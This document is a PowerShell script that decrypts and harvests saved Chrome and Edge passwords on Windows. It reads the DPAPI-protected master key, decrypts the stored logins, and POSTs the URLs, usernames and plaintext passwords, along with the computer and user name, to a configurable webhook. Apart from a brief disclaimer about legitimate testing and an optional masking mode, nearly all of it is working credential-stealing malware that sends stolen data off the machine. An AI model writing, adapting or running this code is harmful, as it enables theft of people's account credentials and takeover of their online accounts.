# ACTUAL Chrome Password Extraction Script
# WARNING: This script extracts real passwords from Chrome/Edge browsers
# Use only for legitimate security testing and educational purposes

param(
    [switch]$TestMode = $false,
    [string]$WebhookUrl = "http://localhost:8080"
)

# Load required assemblies
Add-Type -AssemblyName System.Security
Add-Type -AssemblyName System.Data

# Function to decrypt Chrome master key using DPAPI
function Get-ChromeMasterKey {
    param([string]$LocalStatePath)
    
    try {
        $localState = Get-Content -Path $LocalStatePath -Raw | ConvertFrom-Json
        $encryptedKey = $localState.os_crypt.encrypted_key
        
        if (-not $encryptedKey) {
            throw "No encrypted key found in Local State"
        }
        
        # Decode base64 and remove DPAPI prefix
        $keyBytes = [System.Convert]::FromBase64String($encryptedKey)
        $keyWithoutPrefix = $keyBytes[5..($keyBytes.Length - 1)]
        
        # Decrypt using DPAPI
        $decryptedKey = [System.Security.Cryptography.ProtectedData]::Unprotect(
            $keyWithoutPrefix, 
            $null, 
            [System.Security.Cryptography.DataProtectionScope]::CurrentUser
        )
        
        return $decryptedKey
    } catch {
        Write-Error "Failed to decrypt master key: $_"
        return $null
    }
}

# Function to decrypt AES-GCM encrypted password
function Decrypt-AESGCMPassword {
    param(
        [byte[]]$EncryptedData,
        [byte[]]$MasterKey
    )
    
    try {
        # Chrome uses AES-256-GCM with 12-byte nonce
        if ($EncryptedData.Length -lt 15) {
            throw "Encrypted data too short"
        }
        
        # Extract nonce (first 12 bytes after "v10" prefix)
        $nonce = $EncryptedData[3..14]
        $ciphertext = $EncryptedData[15..($EncryptedData.Length - 17)]
        $tag = $EncryptedData[($EncryptedData.Length - 16)..($EncryptedData.Length - 1)]
        
        # Use .NET AES-GCM (requires .NET 6+ or Windows 10+)
        $aes = [System.Security.Cryptography.AesGcm]::new($MasterKey)
        $plaintext = New-Object byte[] $ciphertext.Length
        $aes.Decrypt($nonce, $ciphertext, $tag, $plaintext)
        $aes.Dispose()
        
        return [System.Text.Encoding]::UTF8.GetString($plaintext)
    } catch {
        # Fallback for older systems or if AES-GCM fails
        Write-Warning "AES-GCM decryption failed: $_"
        return "[ENCRYPTED - Unable to decrypt]"
    }
}

# Function to extract passwords from SQLite database
function Extract-ChromePasswords {
    param(
        [string]$LoginDataPath,
        [byte[]]$MasterKey,
        [string]$BrowserName
    )
    
    $passwords = @()
    $tempDbPath = "$env:TEMP\temp_login_data.db"
    
    try {
        # Copy database to temp location (Chrome locks the original)
        Copy-Item -Path $LoginDataPath -Destination $tempDbPath -Force
        
        # Create SQLite connection
        $connectionString = "Data Source=$tempDbPath;Version=3;"
        $connection = New-Object System.Data.SQLite.SQLiteConnection($connectionString)
        $connection.Open()
        
        # Query for saved passwords
        $query = "SELECT origin_url, username_value, password_value FROM logins WHERE username_value != '' AND password_value != ''"
        $command = New-Object System.Data.SQLite.SQLiteCommand($query, $connection)
        $reader = $command.ExecuteReader()
        
        while ($reader.Read()) {
            $url = $reader["origin_url"]
            $username = $reader["username_value"]
            $encryptedPassword = [byte[]]$reader["password_value"]
            
            # Decrypt password
            $decryptedPassword = ""
            if ($encryptedPassword.Length -gt 0) {
                if ($encryptedPassword[0..2] -join '' -eq [byte[]]@(118, 49, 48) -join '') {
                    # v10 prefix - use AES-GCM
                    $decryptedPassword = Decrypt-AESGCMPassword -EncryptedData $encryptedPassword -MasterKey $MasterKey
                } else {
                    # Legacy DPAPI encryption
                    try {
                        $decryptedBytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
                            $encryptedPassword,
                            $null,
                            [System.Security.Cryptography.DataProtectionScope]::CurrentUser
                        )
                        $decryptedPassword = [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
                    } catch {
                        $decryptedPassword = "[LEGACY ENCRYPTED - Unable to decrypt]"
                    }
                }
            }
            
            $passwords += [PSCustomObject]@{
                Browser = $BrowserName
                URL = $url
                Username = $username
                Password = $decryptedPassword
            }
        }
        
        $reader.Close()
        $connection.Close()
        
    } catch {
        Write-Error "Failed to extract passwords from $BrowserName : $_"
    } finally {
        # Cleanup
        if (Test-Path $tempDbPath) {
            Remove-Item -Path $tempDbPath -Force -ErrorAction SilentlyContinue
        }
    }
    
    return $passwords
}

# Function to send data to webhook
function Send-ToWebhook {
    param(
        [Parameter(Mandatory = $True)]
        [string]$Data,
        [Parameter(Mandatory = $True)]
        [string]$WebhookUrl
    )

    try {
        $computerName = $env:COMPUTERNAME
        $userName = $env:USERNAME
        $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        
        $payload = @{
            computer = $computerName
            user = $userName
            timestamp = $timestamp
            data = $Data
        } | ConvertTo-Json
        
        $response = Invoke-WebRequest -Uri $WebhookUrl -Method POST -Body $payload -ContentType "application/json" -UseBasicParsing
        Write-Output "Data sent to webhook successfully. Status: $($response.StatusCode)"
        return $true
    } catch {
        Write-Output "Failed to send data to webhook: $_"
        return $false
    }
}

# Main execution
try {
    Write-Output "=== CHROME PASSWORD EXTRACTION ==="
    Write-Output "WARNING: This will extract actual passwords!"
    
    if ($TestMode) {
        Write-Output "Running in TEST MODE - passwords will be masked"
    }
    
    $allPasswords = @()
    $report = "Chrome/Edge Password Extraction Report`n"
    $report += "Computer: $env:COMPUTERNAME`n"
    $report += "User: $env:USERNAME`n"
    $report += "Date: $(Get-Date)`n"
    $report += "Test Mode: $TestMode`n"
    $report += "="*50 + "`n`n"
    
    # Process Chrome
    $chromeLocalState = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
    $chromeLoginData = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
    
    if ((Test-Path $chromeLocalState) -and (Test-Path $chromeLoginData)) {
        Write-Output "Processing Chrome passwords..."
        $chromeMasterKey = Get-ChromeMasterKey -LocalStatePath $chromeLocalState
        
        if ($chromeMasterKey) {
            $chromePasswords = Extract-ChromePasswords -LoginDataPath $chromeLoginData -MasterKey $chromeMasterKey -BrowserName "Chrome"
            $allPasswords += $chromePasswords
            $report += "Chrome: Found $($chromePasswords.Count) saved passwords`n"
        } else {
            $report += "Chrome: Failed to decrypt master key`n"
        }
    } else {
        $report += "Chrome: Browser data not found`n"
    }
    
    # Process Edge
    $edgeLocalState = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"
    $edgeLoginData = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
    
    if ((Test-Path $edgeLocalState) -and (Test-Path $edgeLoginData)) {
        Write-Output "Processing Edge passwords..."
        $edgeMasterKey = Get-ChromeMasterKey -LocalStatePath $edgeLocalState
        
        if ($edgeMasterKey) {
            $edgePasswords = Extract-ChromePasswords -LoginDataPath $edgeLoginData -MasterKey $edgeMasterKey -BrowserName "Edge"
            $allPasswords += $edgePasswords
            $report += "Edge: Found $($edgePasswords.Count) saved passwords`n"
        } else {
            $report += "Edge: Failed to decrypt master key`n"
        }
    } else {
        $report += "Edge: Browser data not found`n"
    }
    
    # Format results
    $report += "`n" + "="*50 + "`n"
    $report += "EXTRACTED PASSWORDS:`n"
    $report += "="*50 + "`n"
    
    if ($allPasswords.Count -gt 0) {
        foreach ($pwd in $allPasswords) {
            $report += "`nBrowser: $($pwd.Browser)`n"
            $report += "URL: $($pwd.URL)`n"
            $report += "Username: $($pwd.Username)`n"
            
            if ($TestMode) {
                $report += "Password: [MASKED IN TEST MODE]`n"
            } else {
                $report += "Password: $($pwd.Password)`n"
            }
            $report += "-"*30 + "`n"
        }
    } else {
        $report += "No passwords found or extraction failed.`n"
    }
    
    $report += "`n" + "="*50 + "`n"
    $report += "Total passwords extracted: $($allPasswords.Count)`n"
    
    Write-Output $report
    
    # Send to webhook
    $outputFile = "$env:TEMP\ExtractedPasswords.txt"
    $report | Out-File -FilePath $outputFile -Encoding UTF8
    
    if (Test-Path $outputFile) {
        $fileData = Get-Content -Path $outputFile -Raw
        Send-ToWebhook -Data $fileData -WebhookUrl $WebhookUrl
        Remove-Item -Path $outputFile -Force -ErrorAction SilentlyContinue
    }
    
    Write-Output "Password extraction completed."
    
} catch {
    Write-Error "An error occurred during password extraction: $_"
}
